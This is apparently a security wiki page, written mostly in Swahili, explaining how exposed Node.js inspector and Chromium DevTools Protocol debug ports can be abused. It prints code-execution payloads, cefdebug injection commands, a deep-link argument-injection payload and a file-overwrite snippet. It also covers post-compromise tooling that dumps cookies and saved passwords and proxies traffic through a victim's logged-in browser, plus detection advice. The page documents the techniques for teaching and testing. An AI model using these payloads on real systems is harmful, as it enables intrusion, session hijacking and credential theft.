# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Mifano ya kihistoria ya vitendo ni pamoja na walkthrough ya Multimaster na shambulio la debugger la Visual Studio Code la CVE-2019-1414; itumie kama muktadha unaohusu matoleo husika, badala ya kudhani kuwa kila lengo la sasa la Electron au Chromium lina primitives zilezile.<sup>[[1]](#references)[[3]](#references)</sup>

## Taarifa za Msingi

[Kutoka kwenye nyaraka](https://nodejs.org/learn/getting-started/debugging): Mchakato wa Node.js unapoanzishwa kwa kutumia swichi ya `--inspect`, husikiliza mteja wa utatuzi. Kwa **chaguomsingi**, utasikiliza kwenye hosti na port **`127.0.0.1:9229`**. Kila mchakato pia hupewa **UUID** ya **kipekee**.<sup>[[4]](#references)</sup>

Wateja wa Inspector lazima wajue na wabainishe anwani ya hosti, port na UUID ili kuunganisha. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina ufikiaji kamili wa mazingira ya utekelezaji ya Node.js**, mshambuliaji anayeweza kuunganisha kwenye port hii anaweza kutekeleza msimbo wowote kwa niaba ya mchakato wa Node.js (**uwezekano wa privilege escalation**).<sup>[[4]](#references)</sup>

Kuna njia kadhaa za kuanzisha Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Unapoanzisha mchakato unaokaguliwa, kitu kama hiki kitaonekana:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processes zinazotumia **CEF** (**Chromium Embedded Framework**) zinaweza kufichua debugger kwa kutumia `--remote-debugging-port=9222`. Hii hufichua browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) badala ya Node.js inspector, kwa hivyo payload zinazotegemea `process` za Node.js hazitumiki moja kwa moja kwa chaguomsingi.<sup>[[2]](#references)[[5]](#references)</sup>

Unapoanzisha browser yenye debugger, kitu kama hiki kitaonekana:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Kuhesabu na kuendesha endpoint ya CDP

Endpoints za HTTP za ugunduzi hutofautisha WebSocket ya **browser** na WebSocket za **target** (tab, worker, extension, n.k.) mahususi. Tuma ombi kwa `/json/version` ili kupata endpoint ya browser na kwa `/json/list` ili kupata targets; kisha unaweza kuendesha moja kwa moja thamani za `webSocketDebuggerUrl` zilizorejeshwa kwa kutumia ujumbe wa aina ya JSON-RPC wa CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Kwa mfano, unganisha kwa `websocat "$BROWSER_WS"` na utume `{"id":1,"method":"Target.getTargets"}` au `{"id":2,"method":"Storage.getCookies"}`. Kwenye page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` hutekelezwa katika renderer hiyo, na `Page.captureScreenshot` hurejesha screenshot iliyosimbwa kwa base64. `document.cookie` haiwezi kufichua cookies za `HttpOnly`, ilhali `Storage.getCookies` huomba browser itoe cookie store yake.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Vivinjari, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zilizofunguliwa kwenye kivinjari zinaweza kutuma maombi ya WebSocket na HTTP chini ya modeli ya usalama ya kivinjari. **Muunganisho wa awali wa HTTP** unahitajika ili **kupata kitambulisho cha kipekee cha kipindi cha debugger**. **same-origin-policy** **huzuia** tovuti kuanzisha **muunganisho huu wa HTTP**. Ili kuongeza usalama dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kwamba **vichwa vya 'Host'** vya muunganisho vinabainisha **anwani ya IP** au **`localhost`** pekee.<sup>[[4]](#references)</sup>

> [!TIP]
> **Hatua hii ya usalama huzuia kutumia inspector vibaya** ili kutekeleza msimbo kwa **kutuma tu ombi la HTTP** (jambo ambalo lingewezekana kwa kutumia SSRF vuln).<sup>[[4]](#references)</sup>

### Kuanzisha inspector katika michakato inayoendelea

Unaweza kutuma **signal SIGUSR1** kwa mchakato unaoendelea wa nodejs ili kuufanya **uanze inspector** kwenye port ya chaguo-msingi. Hata hivyo, kumbuka kwamba unahitaji kuwa na ruhusa za kutosha. Kwa hiyo, hii inaweza kukupa **ufikiaji wa taarifa zilizo ndani ya mchakato kwa ruhusa za juu**, lakini si privilege escalation ya moja kwa moja.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Hii ni muhimu kwenye containers kwa sababu **kusimamisha process na kuanzisha mpya** kwa kutumia `--inspect` **si chaguo** kwa kuwa **container** **itazimwa** pamoja na process.<sup>[[6]](#references)</sup>

### Unganisha kwenye inspector/debugger

Ili kuunganisha kwenye browser inayotumia **Chromium**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufunguliwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, hakikisha kwamba **host na port lengwa** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Baada ya hapo, URL ya kufikia debugger itaonekana. k.m. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha kwenye inspector/debugger: Ili kuunganisha kwenye browser inayotumia Chromium,...](<../../images/image (674).png>)

Kwa kutumia **command line** unaweza kuunganisha kwenye debugger/inspector kwa:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Zana [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) huwezesha **kupata inspectors** zinazoendesha ndani ya mashine na **inject code** ndani yake.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ukiwa umeunganishwa kwenye browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE kwenye NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye Node **inspector** ni kutumia kitu kama (inaonekana kwamba **hii haitafanya kazi kwenye muunganisho wa Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads za Chrome DevTools Protocol

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimeona watu wakitumia kutumia vibaya protocol hii.

### Kizuizi cha wasifu-msingi kuanzia Chrome 136+

Kuanzia **Chrome 136**, Chrome hupuuza `--remote-debugging-port` na `--remote-debugging-pipe` zinapoelekezwa kwenye **saraka-msingi ya data ya Chrome**. Switch lazima iambatane na `--user-data-dir` isiyo ya kawaida, ambayo ufunguo wake tofauti wa usimbaji fiche na hali ya kivinjari iliyotengwa huzuia mbinu rahisi inayotegemea flag kufichua wasifu wa kawaida wa mtumiaji ulioingia. Kizuizi hiki mahususi cha Chrome hakipaswi kudhaniwa kuwa kinatumika kwa matoleo ya zamani ya Chrome, Chrome for Testing, programu za Electron/CEF, au matoleo mengine yanayotokana na Chromium bila kufanya uthibitishaji.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Kwa hivyo, kuona mchakato wa sasa wa Chrome uliozinduliwa kwa `--remote-debugging-port` pekee **hakuthibitishi** kuwa CDP imeanza kufanya kazi. Thibitisha kuwa kuna listener na `/json/version`, na ubaini ni profile ipi inayotumika.<sup>[[14]](#references)</sup>

### Uingizaji wa Vigezo kupitia Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino security iligundua kuwa programu inayotegemea CEF ilisajili **URI maalum** kwenye mfumo (workspaces://index.html), iliyopokea URI nzima kisha **ikazindua programu inayotegemea CEF** kwa usanidi uliojengwa kwa sehemu kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kuwa vigezo vya URI vilifanyiwa URL decoding na kutumiwa kuzindua programu ya msingi ya CEF, jambo lililoruhusu mtumiaji **kuingiza** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza vitendo holela.<sup>[[8]](#references)</sup>

Kwa hiyo, payload kama hii:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Will execute a calc.exe.<sup>[[8]](#references)</sup>

### Kubatilisha Faili

Badilisha folda ambamo **faili zilizopakuliwa zitahifadhiwa** na upakue faili ili **kubatilisha** **msimbo chanzo** unaotumiwa mara kwa mara na programu kwa **msimbo wako hasidi**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE na exfiltration

STAR Labs ilionyesha kuwa huduma za WebDriver/CDP zilizo wazi zinaweza kuruhusu usomaji wa faili kiholela na RCE; DNS rebinding inaweza kukamilisha mnyororo wa exploit katika baadhi ya usanidi.<sup>[[9]](#references)</sup>

Huduma ya WebDriver ya ChromeDriver ni tofauti na Chrome DevTools/CDP. Capability yake ya [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) huchagua executable ya browser itakayoanzishwa kwa session mpya. Ikiwa caller asiye na upendeleo anaweza kufikia huduma ya ChromeDriver inayoendeshwa kama root na kutuma session yenye njia ya executable anayoidhibiti, uanzishaji huo unaweza kuvuka mpaka wa upendeleo wa huduma. Jibu tupu la `/sessions` halithibitishi kama session mpya zinaweza kuundwa. Kagua mmiliki wa process, ufikikaji halisi wa listener, ruhusa za session, ufikikaji wa executable na uzuiaji kabla ya kuhitimisha kuwa njia hiyo inaweza kutumika; jina la process au port inayotumika kwa kawaida pekee havitoshi. [Mwongozo wa usalama wa Google](https://developer.chrome.com/docs/chromedriver/security-considerations) unasema ChromeDriver iendeshwe chini ya akaunti isiyo na upendeleo. Upelelezi tuli haupaswi kuunda session ya WebDriver.

Kwa mifano zaidi ya kihistoria ya browser automation na usalama wa Chromium, tazama write-up ya Counter WebDriver na masuala ya Project Zero 773, 1742 na 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Kuwasha CDP ndani ya process hai ya Chromium

Kizuizi cha Chrome cha default profile huzuia tu njia ya kuiwasha kupitia command line. Kwa ufikiaji wa kutosha wa mtumiaji huyo huyo ili kudhibiti process ya browser, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ya awali na [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) ya Cobalt Strike huita `content::DevToolsAgentHost::StartRemoteDebuggingServer` isiyosafirishwa na Chromium ndani ya `chrome.exe` au `msedge.exe` ambayo tayari inaendeshwa. Kwa hiyo, endpoint inahusishwa na profile halisi na huhifadhi tab zake, extensions, cookies na hali ya uthibitishaji.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Kwa process za kawaida za x64 Chrome/Edge, BOF hutafuta dirisha la browser na `chrome.dll`/`msedge.dll` iliyopakiwa, huchanganua PE ya mbali ili kupata signatures zilizofichwa kwa masks, hutenga stubs na block ya context, hubadilisha kwa muda window procedure, kisha hutekeleza mwito wa mwisho kwenye **UI thread** ya browser. Ingizo muhimu za wakati wa uendeshaji ni `StartRemoteDebuggingServer`, `operator new` ya Chromium, `TCPServerSocketFactory::CreateForHttpServer` na factory vtable. Utekelezaji husimama isipokuwa kila signature ya lazima ipatikane mara moja tu.<sup>[[15]](#references)[[16]](#references)</sup>

BOF hupokea hali ya browser na port ya hiari. Kisha script yake msaidizi inaweza kuthibitisha endpoint na kukusanya cookies; `chrome-iso` ni njia tofauti inayolenga mpaka wa Windows Process Isolation wa Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Njia ya `chrome-iso` hutumia handles zenye ruhusa za query pekee kwa process iliyotengwa. Hutambua `chrome.dll` iliyosakinishwa ambayo ukubwa wa image yake ya PE unalingana na process inayoendeshwa, hutatua symbols kutoka kwenye image hiyo ya ndani, na hutumia dispatch ya Chromium ya `WindowImpl` pamoja na `WM_COPYDATA` ya synchronous na hook iliyopo ya User32 iliyo kwenye image ili kufikia UI thread.<sup>[[16]](#references)</sup>

> [!WARNING]
> Hii ni mbinu ya **post-compromise ya kuchezea browser process**, si bypass ya mtandao isiyohitaji uthibitishaji. Hutegemea build kwa sababu C++ symbols husika haziexportwi na zinaweza kubadilika baada ya masasisho ya browser.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Kusasisha signatures baada ya masasisho ya browser

Tumia toleo halisi la `chrome.dll` au `msedge.dll` lililosakinishwa kwenye target na PDB yake inayolingana. `symchk.exe` kutoka Windows SDK hupakua symbols; kisha scripts za repository hutafuta `StartRemoteDebuggingServer`, kubainisha inputs za allocator/socket-factory, au kuthibitisha kila signature iliyopachikwa kwenye BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Matokeo ya zero-hit au multi-hit hayapaswi kubadilishwa na anwani yoyote ya kubahatisha. Ikiwa pattern inayojulikana ya `operator new` au `CreateForHttpServer` imebadilika sana hivi kwamba haiwezi kutumika kuunda mask mpya, tumia `pe_signature_finder.py` pamoja na PDB kukagua symbol hiyo na kupata mfuatano wa byte ambao ni wa kipekee katika module lengwa.<sup>[[16]](#references)[[18]](#references)</sup>

#### Utoaji wa data kupitia kivinjari kilichothibitishwa kwa CDP Toolkit

Mbinu hii haifanyi decryption ya App-Bound Encryption (ABE) offline wala kuondoa device binding. Badala yake, huitumia browser halali kama **decryption oracle na authenticated interaction proxy**: `Storage.getCookies` huiomba browser inayoendeshwa irudishe cookie store yake, huku workflows za navigation/screencast zikihakikisha kuwa maombi, hifadhi, uthibitishaji wa kampuni na tabia inayohusishwa na kifaa vinaendelea kufanyika ndani ya browser iliyopo ya mwathiriwa.<sup>[[17]](#references)[[18]](#references)</sup>

Baada ya kuelekeza listener ya loopback CDP kupitia pivot ya operator, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) inaweza kuorodhesha na kukusanya artifacts za kawaida.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump`, na `tabs screenshot` kwa kiasi kikubwa ni wrappers za `/json/version`, target list, `Storage.getCookies`, na `Page.captureScreenshot`. History, bookmarks, extensions na metadata ya password, badala yake, huhitaji target ya muda ya `chrome://`/`edge://` WebUI: toolkit husubiri ukurasa u-render, hukagua model au DOM yake, hukusanya matokeo, kisha hufunga target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` hufanya zaidi ya hapo: hufungua origin halisi ya login iliyohifadhiwa, huweka focus kwenye sehemu ya credential, huchagua pendekezo asilia la autofill kwa kutumia CDP input events, kisha husoma thamani zilizojazwa. Origin/port/path lazima zilingane kwa karibu na realm ya password iliyohifadhiwa; visible mode ndiyo chaguo-msingi linalotegemewa kwa sababu dirisha ibukizi la pendekezo ni native browser UI.<sup>[[17]](#references)[[18]](#references)</sup>

Kwa mwingiliano wa moja kwa moja, `browser-takeover screencast` hutiririsha fremu na kutuma input kwa target halisi (ikiwemo hali za background au off-screen). `browser-takeover proxy`, badala yake, hupokea HTTP na HTTPS `CONNECT` locally na kutuma maombi ya upstream kupitia Chrome targets zilizofichwa, ikitumia background tabs pale targets zilizofichwa hazipatikani; hii huhifadhi muktadha wa mtandao/uthibitishaji wa victim lakini si mwaminifu sana kwa client-side applications changamano kwa sababu browser ya operator ndiyo hu-render maudhui yaliyorejeshwa.<sup>[[17]](#references)[[18]](#references)</sup>

Kwa detection, usitegemee telemetry ya command-line ya `--remote-debugging-*` pekee: pia linganisha handles na memory operations zisizo za kawaida zinazohusiana na browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, na listening sockets za loopback zisizotarajiwa zinazomilikiwa na Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Katika mazingira halisi na **baada ya ku-compromise** PC ya mtumiaji inayotumia browser yenye msingi wa Chromium, mbinu ya kihistoria ilikuwa kuanzisha upya browser ikiwa debugging imewezeshwa na ku-forward loopback port. Hii inaweza kufichua hali ya victim ya kuvinjari kwenye products/builds ambazo bado zinakubali profile iliyochaguliwa, lakini Chrome 136+ haitatekeleza hili dhidi ya default data directory yake.<sup>[[7]](#references)[[14]](#references)</sup>

Amri ya awali ya kuanzisha upya imehifadhiwa hapa chini kwa targets za zamani/zinazotegemea version. Amri ya pili ndiyo njia inayoungwa mkono na Chrome ya sasa, lakini huunda profile iliyotengwa badala ya kufungua tena hali ya kawaida ya victim iliyothibitishwa.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Kwa tradecraft mahususi ya macOS ya relaunch ya Chromium, extensions na CDP, angalia [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Chombo cha kukagua na kutumia vibaya debugger ya CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution kupitia Chrome DevTools Debugger katika Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Mwongozo wa Debugging wa Node.js - Jinsi ya Kuanza](https://nodejs.org/learn/getting-started/debugging)
- [5] [Itifaki ya Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Maelezo ya corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Kutumia Vibaya Kipengele cha Debugging cha Chrome Kufuatilia na Kudhibiti Vipindi vya Kuvinjari kwa Mbali](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution katika AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Unazungumza Nami? - WebDriver RCE kupitia DNS Rebinding na CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Kukabiliana na WebDriver - Kutoka Bot hadi RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (kifuatiliaji cha hitilafu cha Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Mabadiliko ya remote debugging switches ili kuboresha usalama - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Kuingiza CDP katika kivinjari cha Edge kinachoendelea kufanya kazi: Uchunguzi wa kina wa Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Kurudi kwa Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
